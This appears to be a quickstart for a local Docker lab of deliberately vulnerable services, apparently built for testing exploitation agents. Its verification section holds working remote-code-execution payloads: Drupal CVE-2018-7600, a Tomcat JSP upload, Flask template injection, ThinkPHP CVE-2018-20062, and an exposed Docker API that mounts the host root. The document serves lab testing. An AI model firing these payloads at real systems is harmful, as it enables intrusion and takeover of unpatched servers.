# Quickstart: Vulnerable Test Lab

**Phase**: 1 — Design & Contracts
**Date**: 2026-06-02

## Prerequisites

- Docker Desktop (macOS) or Docker Engine (Linux)
- Git
- ~2GB free disk space

## Deploy

```bash
cd lab
./scripts/deploy-all.sh
```

Wait ~2 minutes. Verify all targets:

| Target | URL | Check |
|--------|-----|-------|
| Drupal | http://localhost:8081 | Drupal install page |
| Tomcat | http://localhost:8082 | Tomcat welcome page |
| Flask | http://localhost:8000/?name=test | "Hello test" |
| ThinkPHP | http://localhost:8083 | ThinkPHP 5 welcome |
| Docker API | curl http://localhost:2375/version | JSON response |

## Manual Exploit Verification

```bash
# Drupal (CVE-2018-7600)
curl -k 'http://localhost:8081/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=exec&mail[a][#type]=markup&mail[a][#markup]=id'

# Tomcat (CVE-2017-12615)
curl -X PUT 'http://localhost:8082/test.jsp/' -d '<% out.println("VULN");%>'
curl 'http://localhost:8082/test.jsp'

# Flask SSTI
curl 'http://localhost:8000/?name={{7*7}}'       # → Hello 49
curl 'http://localhost:8000/?name={{ lipsum.__globals__["os"].popen("id").read() }}'

# ThinkPHP (CVE-2018-20062)
curl 'http://localhost:8083/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'

# Docker API
curl -X POST -H 'Content-Type: application/json' \
  http://localhost:2375/containers/create?name=test \
  -d '{"Image":"alpine","Cmd":["id"],"Binds":["/:/mnt:rbind"],"Privileged":true}'
curl -X POST http://localhost:2375/containers/test/start
curl http://localhost:2375/containers/test/logs?stdout=true
```

## Lifecycle

```bash
./scripts/deploy-all.sh    # Deploy lab
./scripts/stop-all.sh      # Stop lab
./scripts/reset-all.sh     # Reset to clean state
```

## Exploitation Validation

After running an exploit, agents confirm RCE using 3 layers (fallback order):

```bash
# L1 — Check marker file absence
[ ! -f /tmp/agent_is_present ] && echo "ON_TARGET" || echo "ON_AGENT"

# L2 — Environment fingerprint
ip a | grep -E '172\.' && echo "CONTAINER_NET"
cat /proc/1/cgroup | grep -q docker && echo "DOCKER_CGROUP"

# L3 — Create unique artifact
touch /tmp/pwned_$(date +%s_%N)
ls -la /tmp/pwned_*
```

## Stop

```bash
docker compose down
```
